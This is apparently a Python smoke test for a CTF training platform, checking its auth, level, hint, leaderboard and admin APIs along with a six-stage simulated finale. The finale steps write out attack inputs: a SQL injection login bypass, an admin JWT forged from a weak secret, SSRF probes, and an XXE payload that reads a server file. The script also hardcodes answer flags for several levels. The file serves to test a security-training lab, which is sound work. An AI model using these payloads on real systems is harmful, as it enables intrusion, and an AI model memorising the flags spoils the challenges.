"""
ATF Lab - 端到端 API 冒烟测试

覆盖：健康检查 / 注册登录 / 关卡列表 / flag 校验 / 提示解锁 /
      排行榜 / 个人主页 / 管理后台 / 压轴关六阶段 / 安全边界自查

用法：python scripts/smoke_test.py [base_url]
"""
import io
import json
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8899"
RESULTS = []


def call(method, path, body=None, token=None, expect_code=0):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8")
    try:
        return json.loads(raw)
    except Exception:
        return {"code": -1, "message": "non-json: " + raw[:200], "data": None,
                "_raw": raw}


def check(name, cond, detail=""):
    RESULTS.append((name, bool(cond), detail))
    return bool(cond)


def main():
    # ---------- 健康检查 ----------
    h = call("GET", "/api/v1/health")
    check("health 返回 code=0", h.get("code") == 0, str(h.get("message"))[:60])
    n_levels = (h.get("data") or {}).get("levels", 0)
    check("关卡数 >= 37", n_levels >= 37, "levels=%s" % n_levels)

    # ---------- 注册 / 登录 ----------
    import random
    uname = "smoke_%d" % random.randint(100000, 999999)
    reg = call("POST", "/api/v1/auth/register",
               {"username": uname, "password": "Sm0keTest!42", "email": "s@atf.local"})
    check("注册成功", reg.get("code") == 0, str(reg.get("message"))[:60])
    token = (reg.get("data") or {}).get("token")
    check("注册返回 token", bool(token))

    dup = call("POST", "/api/v1/auth/register",
               {"username": uname, "password": "Sm0keTest!42"})
    check("重复用户名返回 1005", dup.get("code") == 1005, "code=%s" % dup.get("code"))

    bad = call("POST", "/api/v1/auth/login",
               {"username": uname, "password": "wrong-password"})
    check("错误密码返回 1002", bad.get("code") == 1002, "code=%s" % bad.get("code"))

    me = call("GET", "/api/v1/auth/me", token=token)
    check("me 返回用户名", (me.get("data") or {}).get("username") == uname)

    noauth = call("GET", "/api/v1/auth/me")
    check("未授权访问 me 返回 1002", noauth.get("code") == 1002)

    # ---------- 关卡列表 ----------
    lst = call("GET", "/api/v1/levels", token=token)
    check("关卡列表 code=0", lst.get("code") == 0)
    levels = (lst.get("data") or {}).get("levels", [])
    check("关卡数 >= 37", len(levels) >= 37, "got %d" % len(levels))

    raw = json.dumps(lst, ensure_ascii=False)
    check("列表不泄露 flag 明文", "flag{" not in raw,
          "发现 flag 明文泄露" if "flag{" in raw else "")
    unsolved = [l for l in levels if not l.get("solved")]
    check("未通关关卡不返回 writeup",
          all(l.get("writeup") is None for l in unsolved),
          "有 %d 个未通关关卡泄露了 writeup" % sum(
              1 for l in unsolved if l.get("writeup")))

    # ---------- 分类 / 搜索 ----------
    cats = (lst.get("data") or {}).get("categories", [])
    check("分类数 >= 5", len(cats) >= 5, "cats=%d" % len(cats))
    filtered = call("GET", "/api/v1/levels?category=%E5%AF%86%E7%A0%81%E5%AD%A6", token=token)
    fc = (filtered.get("data") or {}).get("levels", [])
    check("按分类筛选生效", len(fc) > 0 and len(fc) < len(levels),
          "filtered=%d" % len(fc))
    searched = call("GET", "/api/v1/levels?keyword=redis", token=token)
    sc = (searched.get("data") or {}).get("levels", [])
    check("关键词搜索生效", len(sc) >= 1, "found=%d" % len(sc))

    # ---------- flag 校验 ----------
    wrong = call("POST", "/api/v1/levels/L01/submit", {"flag": "flag{nope}"}, token=token)
    check("错误 flag 返回 correct=false",
          (wrong.get("data") or {}).get("correct") is False)

    right = call("POST", "/api/v1/levels/L01/submit",
                 {"flag": "flag{html_comment_leak}"}, token=token)
    check("正确 flag 通过", (right.get("data") or {}).get("correct") is True)
    check("首次通关给分", (right.get("data") or {}).get("points_awarded", 0) > 0)

    again = call("POST", "/api/v1/levels/L01/submit",
                 {"flag": "flag{html_comment_leak}"}, token=token)
    check("重复通关不重复给分",
          (again.get("data") or {}).get("points_awarded") == 0)
    check("已通关后返回 writeup",
          bool((again.get("data") or {}).get("writeup")))

    # ---------- 提示解锁 ----------
    hint = call("POST", "/api/v1/levels/L02/hint/0", token=token)
    check("解锁提示成功", hint.get("code") == 0 and bool(
        (hint.get("data") or {}).get("text")))
    badhint = call("POST", "/api/v1/levels/L02/hint/999", token=token)
    check("越界提示返回 1001", badhint.get("code") == 1001)

    # ---------- 排行榜 / 个人主页 ----------
    lb = call("GET", "/api/v1/leaderboard", token=token)
    check("排行榜 code=0", lb.get("code") == 0)
    check("排行榜有条目", len((lb.get("data") or {}).get("entries", [])) >= 1)

    prof = call("GET", "/api/v1/me/profile", token=token)
    check("个人主页 code=0", prof.get("code") == 0)
    check("个人主页含徽章", len((prof.get("data") or {}).get("all_badges", [])) > 0)

    # ---------- 压轴关 L37 六阶段 ----------
    # L37 有解锁门槛：需先通关 5 个教学关。这里先锁定"未解锁"行为，再解锁。
    locked = call("POST", "/api/v1/levels/L37/submit",
                  {"flag": "flag{reaper_archive_destroyed}"}, token=token)
    check("★L37 未达门槛时正确拒绝(1008)", locked.get("code") == 1008,
          "code=%s（必须为 1008）" % locked.get("code"))

    # 通关 5 个教学关以解锁压轴关
    prereq = [
        ("L16", "flag{caesar_shift_three}"),
        ("L17", "flag{nested_encoding_layers}"),
        ("L18", "flag{md5_password_cracked}"),
        ("L22", "flag{png_appended_data}"),
        ("L27", "flag{port_31337_debug}"),
    ]
    for lid, f in prereq:
        r = call("POST", "/api/v1/levels/%s/submit" % lid, {"flag": f}, token=token)
        check("前置关 %s 通关" % lid, (r.get("data") or {}).get("correct") is True,
              str(r.get("message"))[:50])

    lst2 = call("GET", "/api/v1/levels/L37", token=token)
    check("L37 解锁状态为 true", (lst2.get("data") or {}).get("unlocked") is True)

    p0 = call("GET", "/api/v1/finale/progress", token=token)
    check("压轴关进度可读", p0.get("code") == 0)

    s1 = call("GET", "/api/v1/finale/legacy/employees", token=token)
    check("阶段1 员工名录", len((s1.get("data") or {}).get("employees", [])) >= 3)

    s2 = call("POST", "/api/v1/finale/login",
              {"username": "' OR '1'='1", "password": "x"}, token=token)
    check("阶段2 注入绕过登录", (s2.get("data") or {}).get("injected") is True)
    emp_jwt = (s2.get("data") or {}).get("employee_jwt")

    # 关键安全边界：压轴关的 token 不能通过平台校验
    plat = call("GET", "/api/v1/auth/me", token=emp_jwt)
    check("★压轴关 JWT 无法提权平台", plat.get("code") == 1002,
          "code=%s（必须为 1002）" % plat.get("code"))

    s2b = call("POST", "/api/v1/finale/login",
               {"username": "m.chen", "password": "x"}, token=token)
    check("阶段2 无注入则拒绝", s2b.get("code") == 1002)

    # 阶段3：非 admin token 应被拒
    s3bad = call("GET", "/api/v1/finale/admin?token=" + (emp_jwt or ""), token=token)
    check("阶段3 员工 token 被拒(1003)", s3bad.get("code") == 1003,
          "code=%s" % s3bad.get("code"))

    # 用弱密钥伪造 admin token
    admin_jwt = None
    try:
        import jwt as _jwt
        import time as _t
        admin_jwt = _jwt.encode(
            {"sub": "3", "username": "portal_admin", "role": "admin",
             "iat": int(_t.time()), "exp": int(_t.time()) + 3600,
             "aud": "helios-portal-sim", "iss": "helios-portal"},
            "helios-dev-secret", algorithm="HS256")
    except Exception as e:
        check("可伪造 admin JWT", False, str(e))

    if admin_jwt:
        s3 = call("GET", "/api/v1/finale/admin?token=" + admin_jwt, token=token)
        check("阶段3 伪造 admin 提权成功",
              (s3.get("data") or {}).get("admin_granted") is True,
              str(s3.get("message"))[:60])

    # 阶段4：SSRF 白名单
    s4bad = call("POST", "/api/v1/finale/health-check",
                 {"url": "http://evil.example.com/"}, token=token)
    check("阶段4 外部 URL 被拒(1001)", s4bad.get("code") == 1001,
          "code=%s" % s4bad.get("code"))
    s4 = call("POST", "/api/v1/finale/health-check",
              {"url": "http://internal.helios-sim.invalid/archive"}, token=token)
    body = (s4.get("data") or {}).get("body") or {}
    akey = body.get("archive_key")
    check("阶段4 内置端点返回 archive_key", bool(akey))

    # 阶段5：XXE
    s5bad = call("POST", "/api/v1/finale/archive/search",
                 {"xml": "<r/>", "archive_key": akey}, token=token)
    check("阶段5 无实体被拒(1001)", s5bad.get("code") == 1001)
    xxe = ('<?xml version="1.0"?><!DOCTYPE r ['
           '<!ENTITY x SYSTEM "file:///etc/helios/archive.conf">]><r>&x;</r>')
    s5 = call("POST", "/api/v1/finale/archive/search",
              {"xml": xxe, "archive_key": akey}, token=token)
    dtok = (s5.get("data") or {}).get("destruction_token")
    check("阶段5 返回 destruction_token", bool(dtok))

    # 阶段6：销毁
    s6bad = call("POST", "/api/v1/finale/archive/destroy",
                 {"destruction_token": dtok, "confirm": "nope"}, token=token)
    check("阶段6 错误确认短语被拒(1001)", s6bad.get("code") == 1001)
    s6 = call("POST", "/api/v1/finale/archive/destroy",
              {"destruction_token": dtok, "confirm": "CONFIRM DESTRUCTION"},
              token=token)
    check("阶段6 销毁成功", (s6.get("data") or {}).get("destroyed") is True)

    ann = call("POST", "/api/v1/levels/L37/submit",
               {"flag": "flag{reaper_archive_destroyed}"}, token=token)
    check("L37 flag 校验通过", (ann.get("data") or {}).get("correct") is True)

    pf = call("GET", "/api/v1/finale/progress", token=token)
    check("压轴关记录全部阶段",
          (pf.get("data") or {}).get("completed_stages") == 6,
          "stages=%s" % (pf.get("data") or {}).get("completed_stages"))

    # ---------- 管理后台 ----------
    stats = call("GET", "/api/v1/admin/stats", token=token)
    check("管理后台统计（非管理员应 1003 或 0）",
          stats.get("code") in (0, 1003), "code=%s" % stats.get("code"))
    nocred = call("GET", "/api/v1/admin/stats")
    check("未登录访问管理后台 1002", nocred.get("code") == 1002)

    # ---------- 输出 ----------
    passed = sum(1 for _, ok, _ in RESULTS if ok)
    total = len(RESULTS)
    lines = ["ATF Lab 冒烟测试报告", "=" * 60]
    for name, ok, detail in RESULTS:
        lines.append("%s %s%s" % ("PASS" if ok else "FAIL", name,
                                  ("  <- " + detail) if (detail and not ok) else ""))
    lines.append("=" * 60)
    lines.append("通过 %d / %d" % (passed, total))
    report = "\n".join(lines)
    io.open("smoke_result.txt", "w", encoding="utf-8").write(report)
    sys.stdout.write("smoke test: passed %d/%d (details in smoke_result.txt)\n"
                     % (passed, total))
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
